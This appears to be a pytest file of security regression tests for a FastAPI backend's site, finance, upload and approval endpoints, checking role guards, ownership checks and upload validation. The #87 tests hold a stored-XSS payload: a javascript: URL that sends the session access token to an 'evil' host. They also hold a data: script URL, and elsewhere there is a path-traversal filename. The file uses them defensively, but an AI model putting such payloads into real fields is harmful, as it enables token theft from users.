"""Security regression tests — issues #102, #104, #86, #88, #87 (backend half).

Each test FAILS on the pre-fix code and PASSES after:

* #102 — PATCH /sites/{id}/status dispatcher had NO role guard: executives
  could approve/reject/shortlist/archive (supervisor-only on the dedicated
  /bd routes).
* #104 — documents/activity/finance/photos endpoints checked tenant but not
  executive ownership (get_site / LOI upload already enforce it).
* #86  — approve_my_pending_exec dropped the `notes` ownership marker the
  list query enforces, letting any supervisor bind any pending user.
* #88  — design deliverable upload wrote to storage before tenant/kind
  validation, with an unscoped (no tenant prefix) object key.
* #87  — google_maps_url persisted with no scheme allowlist → stored XSS via
  `javascript:` href in SiteDrawer / NsoReviewPage.
"""
from __future__ import annotations

import uuid
from types import SimpleNamespace

import pytest
from fastapi import HTTPException
from pydantic import ValidationError

from app.domain.schemas.site import CreateDraftRequest, PatchSiteStatusRequest
from app.domain.state_machine import SiteStatus


TENANT = str(uuid.uuid4())
OWNER = str(uuid.uuid4())
OTHER_EXEC = str(uuid.uuid4())
SITE_ID = str(uuid.uuid4())
SUPERVISOR_ID = str(uuid.uuid4())


def _site(**over):
    base = dict(
        id=uuid.UUID(SITE_ID),
        tenant_id=uuid.UUID(TENANT),
        submitted_by=uuid.UUID(OWNER),
        assigned_to=None,
        supervisor_id=None,
        status=SiteStatus.LOI_UPLOADED.value,
        finance_status="pending",
        kyc_verified=False,
        ca_code=None,
        finance_amount=None,
        name="Test Site",
        code="BT-TST-0001",
    )
    base.update(over)
    return SimpleNamespace(**base)


def _exec_user(sub: str) -> dict:
    return {"sub": sub, "name": "Exec", "role": "executive", "tenant_id": TENANT, "module": "bd"}


def _supervisor(sub: str = SUPERVISOR_ID) -> dict:
    return {"sub": sub, "name": "Sup", "role": "supervisor", "tenant_id": TENANT, "module": "bd"}


# ── #102 — status dispatcher role guard ───────────────────────────────────

@pytest.mark.parametrize(
    "new_status",
    [SiteStatus.APPROVED, SiteStatus.REJECTED, SiteStatus.SHORTLISTED, SiteStatus.ARCHIVED],
)
async def test_patch_site_status_supervisor_only_branches_block_executives(
    session, new_status,
):
    """An executive PATCHing a supervisor-only transition must get 403 —
    BEFORE any service/DB work happens (pre-fix the call fell through to the
    service, which has no role check)."""
    from app.routers.sites import patch_site_status

    body = PatchSiteStatusRequest(status=new_status, payload={"note": "x", "reasons": ["r"]})
    with pytest.raises(HTTPException) as exc:
        await patch_site_status(
            SITE_ID, body, session, current_user=_exec_user(OTHER_EXEC), tenant_id=TENANT,
        )
    assert exc.value.status_code == 403
    assert session.executed == []  # guard fired before any SQL


async def test_patch_site_status_supervisor_reaches_service(session):
    """Supervisors pass the new guard — the call proceeds into the service
    (which 404s on the empty recording session, proving we got past authz)."""
    from app.routers.sites import patch_site_status

    body = PatchSiteStatusRequest(status=SiteStatus.REJECTED, payload={"reasons": ["r"]})
    with pytest.raises(HTTPException) as exc:
        await patch_site_status(
            SITE_ID, body, session, current_user=_supervisor(), tenant_id=TENANT,
        )
    assert exc.value.status_code == 404  # fetch_site_or_404 on empty session


# ── #104 — executive ownership on sibling site endpoints ───────────────────

async def test_documents_endpoint_blocks_non_owner_executive(session, fake_result):
    from app.routers.sites import get_site_documents

    session.queue(fake_result(scalar=_site()))
    with pytest.raises(HTTPException) as exc:
        await get_site_documents(
            SITE_ID, session, current_user=_exec_user(OTHER_EXEC), tenant_id=TENANT,
        )
    assert exc.value.status_code == 403


async def test_documents_endpoint_allows_owner_executive(session, fake_result):
    from app.routers.sites import get_site_documents

    session.queue(fake_result(scalar=_site()), fake_result(scalars_list=[]))
    out = await get_site_documents(
        SITE_ID, session, current_user=_exec_user(OWNER), tenant_id=TENANT, limit=100,
    )
    assert out["documents"] == []


async def test_activity_endpoint_blocks_non_owner_executive(session, fake_result):
    from app.routers.sites import get_site_activity

    session.queue(fake_result(scalar=_site()))
    with pytest.raises(HTTPException) as exc:
        await get_site_activity(
            SITE_ID, session, current_user=_exec_user(OTHER_EXEC), tenant_id=TENANT,
            module=None,
        )
    assert exc.value.status_code == 403


async def test_finance_draft_blocks_non_owner_executive(session, fake_result):
    from app.services.finance_service import svc_save_finance_draft

    session.queue(fake_result(scalar=_site()))
    with pytest.raises(HTTPException) as exc:
        await svc_save_finance_draft(
            session, tenant_id=TENANT, actor=_exec_user(OTHER_EXEC), site_id=SITE_ID,
            kyc_verified=True,
        )
    assert exc.value.status_code == 403


async def test_finance_draft_allows_assigned_executive(session, fake_result):
    from app.services.finance_service import svc_save_finance_draft

    site = _site(assigned_to=uuid.UUID(OTHER_EXEC))
    session.queue(fake_result(scalar=site))
    out = await svc_save_finance_draft(
        session, tenant_id=TENANT, actor=_exec_user(OTHER_EXEC), site_id=SITE_ID,
        kyc_verified=True,
    )
    assert out["kyc_verified"] is True


async def test_photo_upload_blocks_non_owner_executive_before_storage(
    session, fake_result, monkeypatch,
):
    """Ownership must be enforced BEFORE the storage write — a non-owner
    executive can't even litter the bucket."""
    import app.services.photo_service as photo_service

    calls = []

    async def _fake_upload(**kw):
        calls.append(kw)

    monkeypatch.setattr(photo_service, "upload_bytes", _fake_upload)
    session.queue(fake_result(scalar=_site()))
    with pytest.raises(HTTPException) as exc:
        await photo_service.svc_upload_photo(
            session, tenant_id=TENANT, actor=_exec_user(OTHER_EXEC), site_id=SITE_ID,
            filename="a.jpg", content_type="image/jpeg", file_bytes=b"x",
        )
    assert exc.value.status_code == 403
    assert calls == []


# ── #86 — supervisor approve must re-check the ownership marker ────────────

async def test_approve_pending_exec_requires_ownership_marker(session, fake_result):
    """The UPDATE must carry the `notes = :marker` ownership predicate (and the
    pending/role predicates) the list query uses — not just id + tenant."""
    from app.services.supervisor_code_service import approve_my_pending_exec

    marker = f"pending_supervisor:{SUPERVISOR_ID}|module:bd"
    session.queue(
        fake_result(mappings_rows=[{"is_active": False, "role": "executive", "notes": marker}]),
    )
    await approve_my_pending_exec(
        session, tenant_id=TENANT, supervisor_id=SUPERVISOR_ID, user_id=OTHER_EXEC, module="bd",
    )
    update_sql = next(s for s in session.executed if "UPDATE users" in s)
    assert ":marker" in update_sql
    assert "is_active = false" in update_sql
    assert "role = 'executive'" in update_sql


async def test_approve_pending_exec_rejects_other_supervisors_recruit(session, fake_result):
    """A pending exec whose marker names a DIFFERENT supervisor (or module)
    must not be approvable — 404, and no UPDATE/INSERT is emitted."""
    from app.services.supervisor_code_service import approve_my_pending_exec

    other_marker = f"pending_supervisor:{uuid.uuid4()}|module:legal"
    session.queue(
        fake_result(mappings_rows=[{"is_active": False, "role": "executive", "notes": other_marker}]),
    )
    with pytest.raises(HTTPException) as exc:
        await approve_my_pending_exec(
            session, tenant_id=TENANT, supervisor_id=SUPERVISOR_ID, user_id=OTHER_EXEC, module="bd",
        )
    assert exc.value.status_code == 404
    assert not any("UPDATE users" in s for s in session.executed)
    assert not any("INSERT INTO user_module_memberships" in s for s in session.executed)


async def test_reject_pending_exec_scoped_to_own_recruits(session):
    """Same class as #86 (found by the repo sweep): the reject DELETE must be
    scoped to the caller's own pending recruits via the notes marker — not
    'any inactive user in the tenant'."""
    from app.services.supervisor_code_service import reject_my_pending_exec

    await reject_my_pending_exec(session, TENANT, OTHER_EXEC, SUPERVISOR_ID)
    delete_sql = next(s for s in session.executed if "DELETE FROM users" in s)
    assert ":marker_prefix" in delete_sql
    assert "role = 'executive'" in delete_sql


# ── #88 — design upload: validate first, tenant-scoped key ─────────────────

class _FakeUpload:
    filename = "../evil plan.pdf"
    content_type = "application/pdf"


async def test_design_upload_validates_kind_before_storage_write(
    session, fake_result, monkeypatch,
):
    import app.routers.design as design_router

    calls = []

    async def _fake_upload(**kw):
        calls.append(kw)

    async def _fake_read(file, **kw):
        return b"pdf-bytes"

    monkeypatch.setattr(design_router, "storage_upload", _fake_upload)
    monkeypatch.setattr(design_router, "read_upload_capped", _fake_read)

    session.queue(fake_result(scalar=_site()))
    with pytest.raises(HTTPException) as exc:
        await design_router.upload_deliverable(
            SITE_ID, "not-a-kind", session,
            current_user=_exec_user(OWNER), _module=_exec_user(OWNER), tenant_id=TENANT,
            file=_FakeUpload(),
        )
    assert exc.value.status_code in (404, 422)
    assert calls == []  # nothing hit storage before validation


async def test_design_upload_key_is_tenant_scoped_and_sanitised(
    session, fake_result, monkeypatch,
):
    import app.routers.design as design_router

    calls = []

    async def _fake_upload(**kw):
        calls.append(kw)

    async def _fake_read(file, **kw):
        return b"pdf-bytes"

    monkeypatch.setattr(design_router, "storage_upload", _fake_upload)
    monkeypatch.setattr(design_router, "read_upload_capped", _fake_read)

    # site fetch for the pre-upload validation; the downstream submit 404s on
    # the empty session — by then the upload already happened, which is what
    # we're inspecting. Supervisor caller: executives additionally need an
    # allocation (covered by the kind-validation test path).
    session.queue(fake_result(scalar=_site()))
    with pytest.raises(HTTPException):
        await design_router.upload_deliverable(
            SITE_ID, "recce", session,
            current_user=_supervisor(), _module=_supervisor(), tenant_id=TENANT,
            file=_FakeUpload(),
        )
    assert len(calls) == 1
    path = calls[0]["path"]
    assert path.startswith(f"design/{TENANT}/{SITE_ID}/recce/")
    assert ".." not in path and " " not in path


# ── #87 — google_maps_url scheme allowlist (backend half) ──────────────────

def test_create_draft_rejects_javascript_scheme():
    with pytest.raises(ValidationError):
        CreateDraftRequest(
            name="s", city="Mumbai", visit_date="2026-06-01",
            google_maps_url="javascript:fetch('//evil/?t='+sessionStorage['matrix.access_token'])",
        )


def test_create_draft_rejects_data_scheme():
    with pytest.raises(ValidationError):
        CreateDraftRequest(
            name="s", city="Mumbai", visit_date="2026-06-01",
            google_maps_url="DATA:text/html,<script>1</script>",
        )


def test_create_draft_accepts_https_maps_url():
    req = CreateDraftRequest(
        name="s", city="Mumbai", visit_date="2026-06-01",
        google_maps_url="https://maps.app.goo.gl/abc123",
    )
    assert req.google_maps_url == "https://maps.app.goo.gl/abc123"


async def test_finance_reject_router_role_guard(session):
    from app.routers.sites import finance_reject, _FinanceRejectBody

    # 1. Executive user should be rejected with 403 Forbidden
    with pytest.raises(HTTPException) as exc:
        await finance_reject(
            site_id=SITE_ID,
            db=session,
            current_user=_exec_user(OWNER),
            tenant_id=TENANT,
            body=_FinanceRejectBody(reason="test rejection"),
        )
    assert exc.value.status_code == 403

    # 2. Supervisor user should pass role guard and proceed to service (404 on DB)
    with pytest.raises(HTTPException) as exc:
        await finance_reject(
            site_id=SITE_ID,
            db=session,
            current_user=_supervisor(),
            tenant_id=TENANT,
            body=_FinanceRejectBody(reason="test rejection"),
        )
    assert exc.value.status_code == 404
